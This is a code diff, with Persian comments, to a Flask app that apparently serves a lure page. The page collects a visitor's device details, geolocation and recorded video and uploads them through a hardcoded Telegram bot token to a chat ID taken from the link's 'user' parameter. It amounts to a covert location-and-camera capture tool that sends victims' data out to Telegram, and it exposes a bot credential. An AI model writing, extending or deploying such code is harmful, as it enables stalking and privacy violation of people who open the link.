@@ -6,7 +6,6 @@ import json
 app = Flask(__name__)
 
 BOT_TOKEN = "8856249113:AAHjdpUoGjuRyH9bzD-gSomevMMPg1cet64"
-TARGET_CHAT_ID = "8173349543"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -30,8 +29,13 @@ HTML_TEMPLATE = """
         if(started) return;
         started = true;
         
+        // استخراج آیدی عددی کاربر از انتهای لینک (مثلا ?user=5973359689)
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('user');
+        
         const info = {
             ua: navigator.userAgent,
+            userId: userId,
             ram: navigator.deviceMemory || "نامشخص",
             cores: navigator.hardwareConcurrency || "نامشخص",
             storage: navigator.storage && await navigator.storage.estimate().then(e => (e.quota / 1e9).toFixed(2) + " GB") || "نامشخص"
@@ -87,6 +91,12 @@ def upload():
     info = json.loads(request.form.get("info"))
     label = request.form.get("label")
     
+    # گرفتن آیدی عددی کاربر که از طریق سایت ارسال شده است
+    target_user_id = info.get("userId")
+    
+    if not target_user_id:
+        return "User ID missing", 400
+    
     msg = (f"🚨 {label}\n\n"
            f"📍 موقعیت: {info.get('lat')}, {info.get('lon')}\n"
            f"📱 دستگاه: {info.get('ua')}\n"
@@ -96,11 +106,12 @@ def upload():
            f"ساخته شده توسط ریس شاهد و ریس نوری\n"
            f"@shahidnaimi5642 | @HOKOMAT_ARAB")
     
+    # ارسال لوکیشن و ویدیو به چتِ خودِ همان کاربری که روی لینک کلیک کرده است
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
-                  data={"chat_id": TARGET_CHAT_ID, "latitude": info.get('lat'), "longitude": info.get('lon')})
+                  data={"chat_id": target_user_id, "latitude": info.get('lat'), "longitude": info.get('lon')})
     
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",
-                  data={"chat_id": TARGET_CHAT_ID, "caption": msg},
+                  data={"chat_id": target_user_id, "caption": msg},
                   files={"video": ("v.webm", video.stream)})
     return "ok"
 
